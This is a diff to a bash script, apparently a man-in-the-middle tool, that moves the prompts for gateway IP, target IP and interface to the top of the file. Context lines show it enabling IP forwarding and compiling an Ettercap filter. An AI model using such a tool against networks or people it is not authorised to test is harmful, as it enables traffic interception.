@@ -14,6 +14,11 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+   # Get user input
+    read -p "$(echo -e ${YELLOW}[?] Enter the Gateway IP:${NC} )" GATEWAY_IP
+    read -p "$(echo -e ${YELLOW}[?] Enter the Target IP:${NC} )" TARGET_IP
+    #read -p "$(echo -e ${YELLOW}[?] Enter the network interface (e.g., eth0):${NC} )" INTERFACE
+	read -p "$(echo -e "${YELLOW}[?] Enter the network interface (e.g., eth0):${NC}")" INTERFACE
 
 # ---------------------------
 # Main function
@@ -34,11 +39,7 @@ main() {
     echo -e "${BLUE}[*] Enabling IP forwarding...${NC}"
     sudo sysctl -w net.ipv4.ip_forward=1
 
-    # Get user input
-    read -p "$(echo -e ${YELLOW}[?] Enter the Gateway IP:${NC} )" GATEWAY_IP
-    read -p "$(echo -e ${YELLOW}[?] Enter the Target IP:${NC} )" TARGET_IP
-    read -p "$(echo -e ${YELLOW}[?] Enter the network interface (e.g., eth0):${NC} )" INTERFACE
-
+ 
     # Compile the Ettercap filter
     echo -e "${BLUE}[*] Compiling Ettercap filter...${NC}"
     sudo etterfilter proxy_filter.ef -o proxy_filter.efilter
